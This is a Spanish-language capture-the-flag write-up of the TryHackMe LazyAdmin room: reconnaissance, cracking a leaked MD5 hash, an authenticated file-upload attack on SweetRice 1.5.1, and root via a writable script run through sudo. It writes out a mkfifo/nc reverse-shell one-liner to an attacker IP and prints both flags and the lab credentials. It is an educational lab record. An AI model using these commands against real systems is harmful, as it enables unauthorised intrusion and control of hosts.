

# CTF Writeup - LazyAdmin (TryHackMe)

## 📋 Información General
| Campo          | Valor                              |
|----------------|------------------------------------|
| **Plataforma** | TryHackMe                          |
| **Dificultad** | Easy                               |
| **OS**         | Linux (Ubuntu)                     |
| **IP**         | `10.67.145.199`                    |
| **Fecha**      | 30/01/2026                         |
| **Puntos**     | ~20-25 puntos (Easy room)          |

**Tags:** #ctf #tryhackme #easy #linux #sweetrice #cms #arbitrary-file-upload #sudo #perl #reverse-shell

---
## 🎯 Objetivo
- [x] User Flag: `THM{63e5bce9271952aad1113b6f1ac28a07}`
- [x] Root Flag: `THM{6637f41d0177b6f37cb20d775124699f}`

---
## Reconocimiento

### Nmap Scan
**Comando:**
```bash
nmap  -sV -sC -p22,80 -oN nmap_enum.txt 10.67.145.199

```

Resultado:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Puertos Abiertos

|Puerto|Servicio|Versión|
|---|---|---|
|22|ssh|OpenSSH 7.2p2 Ubuntu 4ubuntu2.8|
|80|http|Apache 2.4.18 (Ubuntu)|

---

## 🛠️ Herramientas Utilizadas

- **Reconocimiento:**
    - nmap - Escaneo de puertos y versiones
    - dirb / gobuster - Fuzzing de directorios
- **Explotación:**
    - hydra - Brute force login (opcional)
    - Manual SQL dump analysis + hashcat / john - Crack MD5
    - Arbitrary file upload (SweetRice 1.5.1)
- **Post-explotación:**
    - Reverse shell (mkfifo + nc)
    - Sudo abuse con backup.pl + copy.sh overwrite

---

## 🌐 Enumeración Web

### Fuzzing de Directorios

**Comando (dirb):**

Bash

```
dirb http://10.67.145.199 /usr/share/wordlists/dirb/common.txt
```

**Resultado clave:**

- /content/ → SweetRice instalado (página de "Site close")
- /content/as/ → Panel de administración (login)

### Directorios/Archivos Interesantes

- /content/as/ → Panel admin de SweetRice 1.5.1
- /content/attachment/ → Directory listing abierto (donde se suben archivos)
- /content/mysql_backup/ → Backup SQL expuesto (mysql_bakup_*.sql)

### Tecnologías Detectadas

- **CMS:** SweetRice 1.5.1 (vulnerable a arbitrary file upload)
- **Lenguaje:** PHP
- **Web Server:** Apache 2.4.18 (Ubuntu)
- **Base de datos:** MySQL (credenciales encontradas después)

---

##  Vulnerabilidades Encontradas

### [VULN-001] Arbitrary File Upload (SweetRice 1.5.1)

**Severidad:** Crítica **CVE:** No asignado (exploit público EDB-ID 40716) **Descripción:** Como admin autenticado, se puede subir archivos PHP arbitrarios vía el módulo Attachment / Media Center. 

**Impacto:** Permite ejecutar código remoto (reverse shell) como www-data.

### [VULN-002] Backup Disclosure

**Severidad:** Alta **Descripción:** Directory listing abierto en /content/mysql_backup/ expone dump SQL con hash MD5 del admin. 

**Impacto:** Credenciales del panel admin (manager / Password123)

### [VULN-003] Sudo Privilege Escalation

**Severidad:** Crítica **Descripción:** www-data puede ejecutar /usr/bin/perl /home/itguy/backup.pl como root (NOPASSWD). El script corre /etc/copy.sh (writable por todos). 

**Impacto:** Escalada a root vía overwrite de copy.sh con reverse shell.

---

## 🚀 Explotación

### Initial Access

**Vulnerabilidad explotada:** Backup Disclosure + Arbitrary File Upload **Pasos:**

1. Directory listing → /content/mysql_backup/mysql_bakup_*.sql
    - Encontrado hash MD5 del admin: 42f749ade7f9e195bf475f37a44cafcb
2. Crack del hash (crackstation / john / hashcat):
    - Password: **Password123**
3. Login en panel: [http://10.67.145.199/content/as/](http://10.67.145.199/content/as/)
    - User: manager
    - Pass: Password123
4. Subida de reverse shell (método final usado):
    - Sección **Ads** → nuevo anuncio → pegar reverse shell PHP en el contenido
    - O vía script exploit 40716.py (subida a /content/attachment/)

**Shell obtenida como:** www-data

**User Flag:**

Bash

```
cat /home/itguy/user.txt
# thm{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```

---

## 📈 Escalación de Privilegios

### Enumeración del Sistema

**Sudo -l:**

Bash

```
sudo -l
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

**Hallazgo clave:** backup.pl ejecuta /etc/copy.sh como root. **Permisos de copy.sh:** -rw-r--rwx (writable por todos)

### Vector de Escalación

**Método usado:** Sudo + overwrite de /etc/copy.sh (command execution como root)

**Pasos:**

1. Crear reverse shell en /etc/copy.sh (compatible con sh):
  
    ```
    echo -e '#!/bin/sh\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.167.92 7777 >/tmp/f' > /etc/copy.sh
    ```
    
2. Listener en Kali:
  
    ```
    nc -lvnp 7777
    ```
    
1. Ejecutar el script como root:
    
    ```
    sudo /usr/bin/perl /home/itguy/backup.pl
    ```

**Root Flag:**

```
whoami  # root
cat /root/root.txt
# thm{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```

---
## 🔑 Credenciales Encontradas

|Usuario|Contraseña|Ubicación/Servicio|
|---|---|---|
|manager|Password123|Panel admin SweetRice|
|rice|randompass|MySQL (mysql_login.txt)|

## Lecciones Aprendidas

- Directory listing abierto + backups expuestos = camino directo a credenciales.
- SweetRice 1.5.1 es muy vulnerable (arbitrary upload autenticado).
- Siempre revisar sudo -l en enumeración post-explotación.
- Scripts ejecutados por root (como backup.pl) que llaman archivos writable = escalada garantizada.
- Usar payloads compatibles con sh/dash (mkfifo + nc) evita errores de sintaxis